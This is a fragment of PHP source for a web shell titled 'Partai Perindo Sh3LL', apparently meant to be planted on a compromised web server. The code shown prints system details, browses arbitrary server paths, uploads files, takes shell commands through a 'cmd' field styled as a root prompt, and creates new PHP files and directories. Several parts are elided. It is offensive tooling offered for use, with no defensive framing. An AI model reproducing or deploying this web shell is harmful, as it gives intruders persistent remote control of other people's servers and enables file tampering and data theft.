...
echo '</head>
<body><b>
<p><font color="black">Partai Perindo Sh3LL</p></font>
<center><img src="https://i.ibb.co/71448cZ/Whats-App-Image-2021-08-03-at-16-45-00.jpg" width="250" height="250"></center><br>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">

<tr><td>

<font color="#000000"><center>'.php_uname().'</center></font><br>';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = 
...
if($pat == '' && $id == 0){
$a = true;
echo '<font color=#000000><center>Path : <a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
...
echo '</center><center><form enctype="multipart/form-data" method="POST"><font color="white"><input style="background:grey;font-family: Comic Sans MS " type="file" name="file" />
...
<form><font color="black">
    <label for="cmd">root@localhost:~$ </label>
    <input type="text" name="cmd" placeholder="ls" /></font>
    </form><br>
<audio src="https://e.top4top.io/m_20413mn9m1.mp3" controls></audio>
</body>
...
<td class=td_home>..</td><td class=td_home align=center>NONE</td> <td class=td_home align=center>LINK</td> <td class=td_home align=center> <a href="?option&path='.$pa.'&opt=baru&name=new.php">+ File</a>&nbsp;<a href="?option&path='.$pa.'&opt=btw&type=dir">+ Dir</a> </td></tr>
';
